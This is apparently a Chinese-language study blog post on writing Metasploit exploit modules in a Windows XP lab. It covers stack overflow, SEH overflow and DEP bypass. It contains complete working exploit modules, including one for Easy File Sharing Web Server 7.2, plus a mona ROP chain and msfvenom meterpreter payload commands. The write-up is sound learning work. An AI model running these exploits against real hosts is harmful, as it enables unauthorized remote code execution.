---
title: MasterMsf 3 渗透模块开发
category: metasploit
---

# {{ page.title }}

## 启程

本章一开始写到：

> If debugging is the process of removing bugs, then programming must be the process of putting them in.

在《0day安全》的学习过程中，我们已经接触过基础栈溢出、SEH、DEP的绕过以及其他的更为高级的漏洞利用方式。在这一章可以学习一下，怎样将那些手工操作通过Metasploit变得自动化。

## 使用Metasploit实现栈溢出

本节我们使用Metasploit对一个小型服务器程序进行栈溢出。服务器程序来自[这里](http://redstack.net/blog/category/How%20To.html)。它可以监听端口，并使用一个512字节长的缓冲区接受数据。

漏洞点如下：

```c
int     getl(int fd, char *s)
{
  int   n;
  int   ret;

  s[0] = 0;
  for (n = 0; (ret = recv(fd, s + n, 1, 0)) == 1 && 
         s[n] && s[n] != '\n'; n++)
    ;
  if (ret == -1 || ret == 0)
    return (-1);
  while (n && (s[n] == '\n' || s[n] == '\r' || s[n] == ' ')){
      s[n] = 0;
      n--;
    }
  return (n);
}

void    manage_client(int s)
{
  char buffer[512];
  int cont = 1;

  while (cont){
      send(s, "\r\n> ", 4, 0);
      if (getl(s, buffer) == -1)
        return ;
      if (!strcmp(buffer, "version"))
        send(s, VERSION_STR, strlen(VERSION_STR), 0);
      if (!strcmp(buffer, "quit"))
        cont = 0;
    }
}
```

这是最基础的栈溢出，我们只是借此来体会一下Metasploit编写exploit模块的过程。在[0day安全 Chapter 4 用Metasploit开发Exploit](https://wohin.me/0day/2018/06/14/0day4.html)中我曾经尝试过这种操作，当时没有成功。

我将在XP上运行服务器程序，这样可以避免ASLR的影响，同时需要关闭DEP（关闭方法参考：[0day安全 Chapter 11 亡羊补牢：SafeSEH](https://wohin.me/0day/2018/06/17/0day11.html)，注意，在XP下直接修改`boot.ini`是没法改的，需要右击“我的电脑”选择“属性“、”高级“、”启动故障和恢复-设置“、“编辑”才可以修改）。另外，由于使用的是作者已经编译好的可执行文件，我这里使用[PESecurity](https://github.com/NetSPI/PESecurity)先来检查一下可执行文件本身的防御措施开启情况：

![Screen Shot 2018-10-25 at 10.35.08 PM.png]({{ site.url }}/images/metasploit/A6026EC8FA4A9CCC25B324E2B6BC9990.png)

很好，都没有开。

XP中运行程序：

```bash
# XP is 172.16.56.134
bof-server.exe 10000
```

之后我们与服务器建立连接：

```bash
# Attacker is 172.16.56.1
ncat 172.16.56.134 10000
```

并使用

```bash
python -c "print('A' * 512)"
```

来产生数据并复制到ncat中输入。A的数量每次以4递增。后来发现，当输入524个A时会导致服务器崩溃。

由于之前在做《0day安全》的实验时我将这个XP中的OD设置为了实时调试器（具体可以参考[0day安全 Chapter 5 堆溢出利用](https://wohin.me/0day/2018/06/14/0day5.html)），所以服务器崩溃后自动进入OD。我们在OD中打开寄存器窗口，发现EIP恰好被覆盖为AAAA：

![Screen Shot 2018-10-25 at 10.46.53 PM.png]({{ site.url }}/images/metasploit/6A02D94A6FE45A06158E55C5B170921A.png)

因此可知，524正是缓冲区首到栈上返回地址的偏移量。

于是我们便有了栈上shellcode的构造。非常简单：`520个填充字节+esp跳板+payload`，就不再展开说了。需要注意的是要根据服务端程序的实际情况来避免shellcode中出现badchar，这在[0day安全 Chapter 4 用Metasploit开发Exploit](https://wohin.me/0day/2018/06/14/0day4.html)亦有提到，不必多说。

整个shellcode如下：

![Screen Shot 2018-10-25 at 11.48.06 PM.png]({{ site.url }}/images/metasploit/C99DBB5E65DC376E2881D113A1059D48.png)

我们说过，要让exploit过程尽量自动化。前面计算偏移量是我们自己通过输入不同数量的A计算的，下面首先看一下这个过程的自动化。

### 自动化获得偏移量

我们使用`pattern_create`/`pattern_offset`两款工具。它们位于`framework/tools/exploit`下。

具体操作如下（直接使用系统自带的Ruby执行这两个脚本会出错，所以我用了Metasploit自带的Ruby解释器）：

```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb --length 550
```

得到

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A
```

用它们作为输入，触发程序崩溃，然后看EIP：

![Screen Shot 2018-10-26 at 9.19.18 AM.png]({{ site.url }}/images/metasploit/ECBCD152086901C902C3C5DFA7F389F3.png)

是`72413372`，接着

```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query 72413372 --length 550
```

得到

```
[*] Exact match at offset 520
```

和我们的计算是相符的，不过这个Ruby解释器也不怎么快。

这是什么原理？

我之前在研究Linux下栈溢出时接触过完全相同的工具，当时写了一些文字来解释其原理：

---

**原理介绍-开始**

“有高级玩家开发了[pattern.py](https://github.com/Svenito/exploit-pattern)这个寻找溢出点的程序。先介绍玩法，再讲原理。”

首先生成一串字符串（长度估计得比你的溢出点偏移多就行）：

```shell
./pattern.py 500 > input
```

![overflow-pattern-500.png]({{ site.url }}/images/metasploit/2E39F2CE8BE24386B2687284056BDCC4.png)

然后在gdb中运行目标程序，并以重定向方式输入`r < input`，程序将在某个地址崩溃，如下：

```
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x316a4130 in ?? ()
```

接着只需要：

```bash
./pattern.py 0x316a4130
```

就可以得到：

```
Pattern 0x316a4130 first occurrence at position 272 in pattern.
```

也就是在**基础玩法**中需要`272 * A`作为溢出点偏移。

OK。那么原理呢？

读一下`pattern.py`的源码可知，它按照

```
Aa0Aa1...Aa9...Az9
Ba0...Bz9
...
Za0...Zz9
```

顺序来生成字符串，这串字符串的特点是，其中的任何一个子串在整个字符串中都是首次出现。所以当我们用一串非常长的字符去导致返回地址被覆盖时，覆盖地址的四个字符在上述字符串中是首次出现的，所以就可以根据导致崩溃的四个字符来计算溢出点偏移量。不过按照这个脚本的玩法，该特异字符串最长可达`大写字母数 * 小写字母数 * 数字数 * 每组的长度3 = 20280`，如果溢出所需填充量比这个大，就要考虑加入其他字符了。

**原理介绍-结束**

---

确定了偏移量，接下来就是寻找`jmp esp`跳板。

### 寻找跳板

按照以前的思路，就是用OD的插件找，或者直接在OD中搜索跳板指令。本节我们使用`msfbinscan`。首先OD附加进程看一下服务器加载了哪些模块：

![Screen Shot 2018-10-25 at 11.33.08 PM.png]({{ site.url }}/images/metasploit/171DF69F1C70E8FBD6D37A6C040D3C97.png)

作者在`ws2_32.dll`中找：

```bash
msfbinscan --jump esp ./ws2_32.dll
```

得到

```a
[./ws2_32.dll]
0x71a22b53 push esp; ret
```

不过这个东西似乎没有OD的FindAddr插件来的方便。而且有那么多的DLL可以找到一个直接的jmp跳板，为什么不用。这里权当作尝试好了。后面我还是使用从OD插件FindAddr中找到的`0x7dd333af`作为跳板。

注意，有时候你的工具可能不会那么听话，比如：

我明明执行的是

```bash
python -c "print('A' * 520 + '\xc8\x3a\xd8\x77' + 'BBBBCCCC')" > xx.txt
```

结果用`xxd`查看这个文件，结尾却不是我想要的！！

```
000001e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000001f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000200: 4141 4141 4141 4141 c388 3ac3 9877 4242  AAAAAAAA..:..wBB
00000210: 4242 4343 4343 0a                        BBCCCC.
```

这就很坑了。

换做Perl就没事了：

```bash
perl -e 'print("A" x 520 . "\xc8\x3a\xd8\x77" . "BBBBCCCC")' > xx.txt
```

```
000001e0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
000001f0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000200: 4141 4141 4141 4141 c83a d877 4242 4242  AAAAAAAA.:.wBBBB
00000210: 4343 4343                                CCCC
```

不过这是手工调试时的问题，后面开发msf模块不存在这个问题。

### 确定坏字符

坏字符取决于具体的漏洞环境。根据附录1中的源代码，我们将以下字符当作本次坏字符：

```c
"\x20\x0a\x0d\x00\xff"
```

### 编写exploit模块并exploit

我们可以用`msfvenom`先看一下meterpreter的payload有多长：

```bash
msfvenom --payload windows/meterpreter/bind_tcp RHOST=172.16.56.134 --format c --arch x86 --platform windows --bad "\x00\xff\x20\x0a\x0d" --smallest
```

得到

```
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 632 (iteration=0)
x86/fnstenv_mov chosen with final size 310
Payload size: 310 bytes
```

还好，不是很长。

万事俱备了，模块代码如下：

```ruby
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(update_info(info,
            'Name'      => 'Stack Overflow Example',
            'Description' => %q{
                Stack Based Overflow Example
            },
            'Platform'  => 'win',
            'Author' => 'Rambo',
            'Targets'   => [
                        ['Windows XP SP3', {'Ret' => 0x7dd333af, 'Offset' => 520}]
                       ],
            'Payload'       => {
                        'Space'    => 400,
                        'BadChars' => "\x20\x0a\x0d\x00\xff",
                        },
            'DisclosureDate' => 'Oct 26 2018'
        ))
        register_options(
        [
            Opt::RPORT(10000)
        ], self.class)

    end

    def exploit
        connect
        buf = make_nops(target['Offset'])
        buf = buf + [target['Ret']].pack('V') + payload.encoded
        sock.put(buf)
        handler
        disconnect
    end
end
```

代码很好理解。其中`.pack('V')`是使用小端序。另外`handler`的解释与源码如下：

```ruby
  # Passes the connection to the associated payload handler to see if the
  # exploit succeeded and a connection has been established.  The return
  # value can be one of the Handler::constants.
  #
  def handler(*args)
    if payload_instance && handler_enabled?
      payload_instance.handler(*args)
    end
  end

  def interrupt_handler
    if payload_instance && handler_enabled? && payload_instance.respond_to?(:interrupt_wait_for_session)
      payload_instance.interrupt_wait_for_session()
    end
  end
```

参考[如何向 Metasploit 中增加自定义 exploit 模块？](https://zhuanlan.zhihu.com/p/32509309)，我们可以在`$HOME/.msf4/modules/`下建立对应的目录结构，如`exploits/rambo/`，然后把自己的模块放进去，msfconsole启东时会自动把它加入。

测试：

我们设置payload为`windows/meterpreter/bind_tcp`，run：

![Screen Shot 2018-10-26 at 8.37.03 AM.png]({{ site.url }}/images/metasploit/1ECC2A634A1F7CBC235C04F5537A0774.png)

## 使用Metasploit实现基于SEH的栈溢出

本节我们使用Metasploit对`Easy File Sharing Web Server 7.2`利用SEH实现溢出。它在处理请求时存在漏洞，一个恶意的`HEAD`或`GET`会引起缓冲区溢出。

靶机环境依然是XP，关闭DEP。

Exploit-DB上的同作者的两个PoC都可以实现弹计算器：[Easy File Sharing Web Server 7.2 - HEAD Request Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/39009/)和[Easy File Sharing Web Server 7.2 - GET Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/39008/)，分别是`GET`和`HEAD`方法。参考他的PoC可以给我们一些启发。

（最初我想先通过逆向二进制程序的方式去定位一下漏洞发生点，但是代码量太多，我没有分析出来。未来学习了Fuzzing后可以来尝试一下这个程序。）

### SEH的利用逻辑

作者利用SEH的技巧与我之前研究过的有些许差异：

![Screen Shot 2018-10-26 at 12.40.32 PM.png]({{ site.url }}/images/metasploit/8697BA1795478C420ED5DF56AAEBB181.png)

他何必多此一举呢？直接把Handler覆盖为Shellcode的地址不就可以了？其实作者的这种构造方式更为鲁棒，因为它没有依赖Shellcode的绝对地址，而是使用了短跳转。

但是，这样为什么可行呢？在SEH异常处理函数被调用的时候，ESP指向哪里？为什么依靠PPR就可以返回到“下一条SEH记录地址”这个位置？

参考[[原创]利用SEH异常处理机制绕过GS保护](https://zhuanlan.kanxue.com/article-4391.htm)：

> seh通常利用的是pop pop ret 一旦进入异常处理,就会把Pointer to next SEH的这个地址压入栈中进行系统处理,通过pop pop然后这个地址ret到我们的eip中,因为Pointer to Next..是可控的所以我们控制这个地址来控制eip。

我们验证一下他说的话。利用《0day安全》第六章的测试程序，跟踪到异常处理流程中，如下图：

![Screen Shot 2018-10-26 at 4.51.44 PM.png]({{ site.url }}/images/metasploit/DEBE6EE4CF1612CF5B7754F107A718C7.png)

上图中`call ecx`调用的正是shellcode，而我们注意在栈上（右下方红框内）第二个位置，恰恰是“下一条SEH记录地址”的指针！这样一旦调用shellcode，首先call指令会把一个返回地址压栈。所以恰好可以通过一个PPR来达到作者上面的利用思路。验证完毕。

### 偏移量计算

我按照上一节的方法去输入过量字符来尝试获得崩溃信息，但是这程序竟然直接崩溃退出，没有任何信息。这可能是因为覆盖了SEH，导致它没法给出错误信息就被操作系统给干掉了。用Ollydbg也无法获得这样的信息，所以下面就按照书上的方式老老实实地用Immunity操作（说明自己的调试水平和工具使用水平还有待提高啊）。

生成10000个测试字符：

```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb --length 10000 > xx.txt
```

Vim打开`xx.txt`，在开头加入`HEAD `；然后

```bash
python -c "print(' HTTP/1.0\r\n\r\n')" > y.txt
cat xx.txt y.txt > z.txt
```

接着用Vim十六进制模式编辑`z.txt`，删去`xx.txt`与`y.txt`内容之间的那个`0x0a`。进入Vim十六进制模式的方法如下：

```bash
vim -b z.txt

# In Vim
:%!xxd

# After editing, use the instruction below to save
:%!xxd -r
```

至此，测试文件生成完毕。在XP中打开Immunity，在其中打开`fsws.exe`，然后运行，出现如下窗口：

![Screen Shot 2018-10-26 at 1.25.49 PM.png]({{ site.url }}/images/metasploit/50296D73C6463200A7FA981838BBDCFC.png)

点击Try it。从而进入正常运行窗口：

![Screen Shot 2018-10-26 at 1.26.18 PM.png]({{ site.url }}/images/metasploit/C53B9F8101CBCE99E9F255ABC6BF1B48.png)

此时在攻击机器上

```bash
ncat 172.16.56.134 10000 < z.txt
```

此时Immunity会把程序停止，并报出：

![Screen Shot 2018-10-26 at 1.27.18 PM.png]({{ site.url }}/images/metasploit/6CB9AA109BF3AC80E0C695A6FF0572A9.png)

我们查看此时的SEH：

![Screen Shot 2018-10-26 at 1.27.54 PM.png]({{ site.url }}/images/metasploit/1E099AEC74054E27255592FD2582AFCB.png)

接着

```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query 46356646 --length 10000

# result
[*] Exact match at offset 4065

/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query 34664633 --length 10000

# result
[*] Exact match at offset 4061
```

于是我们知道偏移4061开始是下一条SEH的指针，偏移4065是本SEH的异常处理函数指针。

### 寻找PPR

我们通过在Immunity中执行（需要安装mona）

```
!mona seh
```

来寻找PPR。结果保存在Immunity安装目录下的`seh.txt`中。最后我们选择位于`ImageLoad.dll`的`0x10019993`。

![Screen Shot 2018-10-26 at 1.42.29 PM.png]({{ site.url }}/images/metasploit/DB570215B20A0ECEDE55640046464717.png)

现在就差一个短跳转了，我们可以用Metasploit来提供。

### 编写Exploit模块

```ruby
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Seh

    def initialize(info = {})
        super(update_info(info,
            'Name'      => 'Easy File Sharing HTTP Server 7.2 SEH Overflow (HEAD)',
            'Description' => %q{
                SEH based overflow example
            },
            'Platform'  => 'win',
            'Author' => 'Rambo',
            'Targets'   => [
                        ['Easy File Sharing HTTP Server 7.2', {'Ret' => 0x10019993, 'Offset' => 4061}]
                       ],
            'Privileged' => true,
            'DefaultOptions' =>
                {

                    'EXITFUNC' => 'thread',
                },
            'Payload'       => {
                        'Space'    => 400,
                        'BadChars' => "\x2b\x26\x3d\x25\x3a\x22\x2f\x5c\x2e\x20\x0a\x0d\x00\xff",
                        },
            'DisclosureDate' => 'Dec 2 2015',
            'DefaultTarget' => 0
        ))
        register_options(
        [
            Opt::RPORT(10000)
        ], self.class)

    end
    def exploit
        connect
        weapon = "HEAD "
        weapon << make_nops(target['Offset'])
        weapon << generate_seh_record(target['Ret'])
        weapon << make_nops(19)
        weapon << payload.encoded
        weapon << " HTTP/1.0\r\n\r\n"
        sock.put(weapon)
        handler
        disconnect
    end
end
```

需要解释的是`generate_seh_record(target['Ret'])`，它会把`Ret`作为异常处理函数地址，生成一个8字节的SEH节点。其中“下一条SEH记录地址”这个位置是一个短跳转，类似于`\xeb\x0A\x90\x90`，用来跳过SEH节点跳到后面的shellcode上。

测试：

```
msf exploit(rambo/test) > use exploit/rambo/my_seh

msf exploit(rambo/my_seh) > set RHOST 172.16.56.134
RHOST => 172.16.56.134
msf exploit(rambo/my_seh) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
```

![Screen Shot 2018-10-26 at 2.34.30 PM.png]({{ site.url }}/images/metasploit/C551F378848A8CE09E206971D16F1C7E.png)

## 使用Metasploit绕过DEP

我们使用网上一个博主自己写的[Introducing Vulnserver](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html)作为漏洞示例程序。作者提供了源码，其中有较多漏洞，我们选择如下一处：

```c
else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);				
						Function3(TrunBuf);
						break;
					}
				}
				memset(TrunBuf, 0, 3000);				
				SendResult = send( Client, "TRUN COMPLETE\n", 14, 0 );
}

void Function3(char *Input) {
	char Buffer2S[2000];	
	strcpy(Buffer2S, Input);
}
```

很明显的缓冲区溢出。

### 快速测试无DEP情况

我们先在关闭DEP的环境下快速开发一次exploit：

找偏移：

```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb --length 2500 > ~/y.txt
```

然后在`y.txt`最前面添加`TRUN `，在结尾添加`.`。接着打开服务器程序，用ncat连接：

```
ncat 172.16.56.134 10000 < y.txt
```

程序崩溃，得到崩溃EIP是`43396f43`。接着

```bash
/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb --query  43396f43 --length 2500

[*] Exact match at offset 2007
```

得到偏移。再考虑到要放入标识符`.`（这次我们把`.`不放在结尾了，怕影响后面排布shellcode），所以真正的填充字节应该是`'TRUN .' + '\x90' * 2006`。

再利用FindAddr找跳板地址，最后构成的exploit如下：

```ruby
    def exploit
        connect
        buf = 'TRUN .' + make_nops(target['Offset'])
        buf = buf + [target['Ret']].pack('V') + payload.encoded
        sock.put(buf)
        handler
        disconnect
    end
```

测试：

![Screen Shot 2018-10-26 at 7.51.10 PM.png]({{ site.url }}/images/metasploit/76592FA714B01E68350B8304F4D6D4D1.png)

### 打开并绕过DEP

修改`boot.ini`并重启系统。使用之前的exploit再次攻击：

![Screen Shot 2018-10-26 at 7.55.16 PM.png]({{ site.url }}/images/metasploit/D499F23B11C21818DA17BC7F08025E36.png)

失败，同时在XP上显示：

![Screen Shot 2018-10-26 at 7.55.43 PM.png]({{ site.url }}/images/metasploit/17A498EA51F49161BDB4933CB6A1D258.png)

绕过DEP的方法我们在[0day安全 Chapter 12 数据与程序的分水岭：DEP](https://wohin.me/0day/2018/06/18/0day12.html)已经讲过。这里我们将构建ROP链来调用`VirtualProtect()`关闭DEP并执行Shellcode。具体原理这里不再赘述。

本节我们将使用`mona`去自动化构造ROP链。

将Immunity附加到vulnerserver上，输入

```bash
!mona rop -m *.dll -cp nonull
```

稍等一会儿，在Immunity根目录下找到`rop_chains.txt`文件，这个文件提供非常丰富的内容，列举如下：

- 以Ruby/C/Python/Javascript四种语言格式给出调用VirtualProtect的ROP链
- 以上述四种语言格式给出了调用SetInformationProcess()的ROP链
- 以上述四种语言格式给出了调用SetProcessDEPPolicy()的ROP链

太强大了。我们将Ruby版本的调用VirtualProtect的ROP链复制进入我们的exploit模块，这个模块在之前未开DEP的模块基础上修改得来，如下：

```ruby
class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super(update_info(info,
            'Name'      => 'DEP Bypass Exploit',
            'Description' => %q{
                DEP Bypass Using ROP Chains Example Module
            },
            'Platform'  => 'win',
            'Author' => 'Rambo',
            'Targets'   => [
                        ['Windows XP SP3', {'Offset' => 2006}]
                       ],
            'Payload'       => {
                        'Space'    => 400,
                        'BadChars' => "\x20\x0a\x0d\x00\xff",
                        },
            'DisclosureDate' => 'Oct 26 2018'
        ))
        register_options(
        [
            Opt::RPORT(10000)
        ], self.class)

    end
    # this function is generated by mona
    def create_rop_chain()
        # rop chain generated with mona.py - www.corelan.be
        rop_gadgets =
        [
          0x77c1debf,  # POP EAX # RETN [msvcrt.dll]
          0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
          0x77e62d1c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll]
          0x77f33564,  # XCHG EAX,ESI # RETN [GDI32.dll]
          0x77c130f9,  # POP EBP # RETN [msvcrt.dll]
          0x625011c7,  # & jmp esp [essfunc.dll]
          0x77c0b860,  # POP EAX # RETN [msvcrt.dll]
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x77d4493b,  # NEG EAX # RETN [USER32.dll]
          0x7c9259c8,  # XCHG EAX,EBX # RETN [ntdll.dll]
          0x77bf1d16,  # POP EAX # RETN [msvcrt.dll]
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x77da9b06,  # NEG EAX # RETN [ADVAPI32.dll]
          0x77c28fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll]
          0x7c98b602,  # POP ECX # RETN [ntdll.dll]
          0x7c99e2c7,  # &Writable location [ntdll.dll]
          0x77e0cb20,  # POP EDI # RETN [ADVAPI32.dll]
          0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]
          0x77df5bf7,  # POP EAX # RETN [ADVAPI32.dll]
          0x90909090,  # nop
          0x60fe2449,  # PUSHAD # RETN [hnetcfg.dll]
        ].flatten.pack("V*")

        return rop_gadgets
    end
    def exploit
        connect
        rop_chain = create_rop_chain()
        buf = 'TRUN .' + make_nops(target['Offset'])
        buf = buf + rop_chain + make_nops(16) + payload.encoded + '\r\n'
        sock.put(buf)
        handler
        disconnect
    end
end
```

可以发现，其中不再需要`Ret`。这正是返回导向编程技术（ROP）的先进之处。

测试：

![Screen Shot 2018-10-26 at 8.19.17 PM.png]({{ site.url }}/images/metasploit/D886DB81F91D64270BEB8BEF2760F958.png)

注：`msfrop`可以用来查找零散ROP指令片段。

## 总结

本章让我学到了不同的漏洞利用姿势，也涨了不少眼界，很棒。其中mona构造ROP链的能力让我印象深刻，因为之前在做《0day安全》的实验时，我深刻体会到自己手工构造ROP链去调用VirtualProtect()的繁琐复杂，很消耗脑力，这里竟然把整个过程最核心的部分全然自动化了。这也是高级漏洞利用技术的魅力所在。当然，像之前那样手工去构造、分析的能力是一定要掌握的，这是硬实力。尤其当mona等高级自动化工具面对更为复杂的情况不适用时，我们一定要具备能够修正工具的能力，这就要求我们知其所以然。

总的来说，先手工研究，过一遍，然后想办法让整个流程专业化自动化，这是值得推崇的解决问题的方式。

最后，真的是知道的越多，知道自己不知道的越多。无论是各种系统内部的机制，还是各种工具的原理，我理解得都不是很透彻。

So keep trying `&` hacking and never stop!